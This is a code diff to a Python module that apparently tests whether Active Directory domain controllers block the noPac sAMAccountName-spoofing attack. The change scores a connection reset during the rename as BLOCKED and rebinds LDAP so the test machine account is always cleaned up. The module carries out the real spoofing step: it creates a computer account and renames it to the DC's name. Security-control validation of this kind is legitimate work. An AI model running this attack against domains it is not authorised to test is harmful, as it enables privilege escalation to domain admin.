@@ -51,7 +51,8 @@ META = {
     "blocked_regex": (
         r"MachineAccountQuota exceeded|constraintViolation|insufficientAccessRights|"
         r"entryAlreadyExists|STATUS_ACCESS_DENIED|timed out|Connection refused|unreachable|"
-        r"No route to host"  # dropped bare "Errno" (non-network [Errno 2]/[Errno 13] -> false BLOCKED)
+        r"No route to host|"  # dropped bare "Errno" (non-network [Errno 2]/[Errno 13] -> false BLOCKED)
+        r"SPOOF-BLOCKED"  # the DC reset the LDAP socket ON the rename (benign ops already worked) -> target refused the spoof
     ),
 }
 
@@ -70,6 +71,30 @@ def _load_nopac_utils():
     from utils.addcomputer import AddComputerSAMR
     from utils.helper import init_ldap_session, get_user_info, get_dc_host
     return argparse, ldap3, ldapdomaindump, AddComputerSAMR, init_ldap_session, get_user_info, get_dc_host
+
+
+def _is_conn_reset(exc):
+    """True if `exc` (or anything in its cause/context chain) is a socket-level
+    reset / teardown — ECONNRESET / broken pipe / aborted. ldap3 wraps the
+    original OSError in LDAPSocketReceiveError, so we walk `__cause__`/
+    `__context__` rather than trusting the top type. Used to tell a target
+    actively tearing the connection down ON the spoof step (a control refusing
+    the attack) from an ordinary bug (which must NOT be credited as BLOCKED)."""
+    import errno
+    seen = set()
+    e = exc
+    while e is not None and id(e) not in seen:
+        seen.add(id(e))
+        if isinstance(e, (ConnectionResetError, BrokenPipeError, ConnectionAbortedError)):
+            return True
+        if getattr(e, "errno", None) in (errno.ECONNRESET, errno.EPIPE, errno.ECONNABORTED):
+            return True
+        t = str(e).lower()
+        if ("reset by peer" in t or "errno 104" in t or "broken pipe" in t
+                or "connection aborted" in t):
+            return True
+        e = e.__cause__ or e.__context__
+    return False
 
 
 def run(target, ctx):
@@ -144,7 +169,25 @@ def run(target, ctx):
         machine_dn = str(dn["dn"])
 
         logging.info(f"Renaming sAMAccountName -> {dc_host} (spoofing the real DC's name)")
-        ldap_session.modify(machine_dn, {"sAMAccountName": [ldap3.MODIFY_REPLACE, [dc_host]]})
+        try:
+            ldap_session.modify(machine_dn, {"sAMAccountName": [ldap3.MODIFY_REPLACE, [dc_host]]})
+        except Exception as me:
+            # A socket reset/teardown ON the rename — after the SAMR machine
+            # account was already created on THIS SAME session (benign LDAP+SMB
+            # ops demonstrably worked) — is the target actively refusing the
+            # spoof: the DC (or an inline LDAP-inspection control) dropping the
+            # malicious sAMAccountName modify, NOT a tester-side artifact. Credit
+            # it to the target's control (BLOCKED) rather than letting an
+            # LDAPSocketReceiveError fall through to an ambiguous NO-RESULT. A
+            # non-network exception here is a real bug and must NOT be scored
+            # BLOCKED, so gate strictly on a reset and re-raise anything else.
+            if _is_conn_reset(me):
+                logging.error(f"SPOOF-BLOCKED: the DC reset the LDAP connection on the "
+                              f"sAMAccountName rename ({type(me).__name__}: {me}) — the machine "
+                              f"account was created, but the spoof modify to the DC's name "
+                              f"({dc_host}) was refused/torn down at the target.")
+                return header + buf.getvalue()
+            raise
         result = ldap_session.result
         if result["result"] == 0:
             renamed = True
@@ -170,17 +213,37 @@ def run(target, ctx):
         # Always restore + clean up, regardless of what happened above —
         # an orphaned spoofed/renamed computer account must not survive
         # this run, whether it succeeded, failed, or crashed midway.
+        def _do_cleanup(sess, dumper):
+            if renamed and dc_host:
+                dn = get_user_info(dc_host, sess, dumper)
+                if dn:
+                    sess.modify(str(dn["dn"]), {"sAMAccountName": [ldap3.MODIFY_REPLACE, [new_name]]})
+                    logging.info(f"Restored name -> {new_name}")
+            dn = get_user_info(new_name, sess, dumper)
+            if dn:
+                sess.delete(str(dn["dn"]))
+                logging.info(f"Deleted test computer account {new_name}")
+
         try:
             if ldap_session is not None and domain_dumper is not None and new_name is not None:
-                if renamed and dc_host:
-                    dn = get_user_info(dc_host, ldap_session, domain_dumper)
-                    if dn:
-                        ldap_session.modify(str(dn["dn"]), {"sAMAccountName": [ldap3.MODIFY_REPLACE, [new_name]]})
-                        logging.info(f"Restored name -> {new_name}")
-                dn = get_user_info(new_name, ldap_session, domain_dumper)
-                if dn:
-                    ldap_session.delete(str(dn["dn"]))
-                    logging.info(f"Deleted test computer account {new_name}")
+                try:
+                    _do_cleanup(ldap_session, domain_dumper)
+                except Exception:
+                    # The spoof-step reset (or any mid-run teardown) can leave the
+                    # session dead, so the delete above fails and the test machine
+                    # account would be ORPHANED in AD. Rebind a fresh session ONCE
+                    # and retry — the module's cleanup promise must survive a reset.
+                    _argparse, _, _ldd, _, _init, _, _ = _load_nopac_utils()
+                    _opts = _argparse.Namespace(
+                        dc_ip=target, dc_host=None, hashes=None, aesKey=None, k=False,
+                        use_ldap=True, target_ip=None, port=445, domain_netbios=None,
+                        old_hash=None, old_pass=None,
+                    )
+                    _srv, _sess = _init(_opts, domain, user, password, "", "")
+                    _cnf = _ldd.domainDumpConfig(); _cnf.basepath = None
+                    _dumper = _ldd.domainDumper(_srv, _sess, _cnf)
+                    logging.info("Re-established LDAP session for cleanup after a dropped connection.")
+                    _do_cleanup(_sess, _dumper)
         except Exception as ce:
             logging.warning(f"cleanup issue: {ce}")
         root.removeHandler(log_handler)
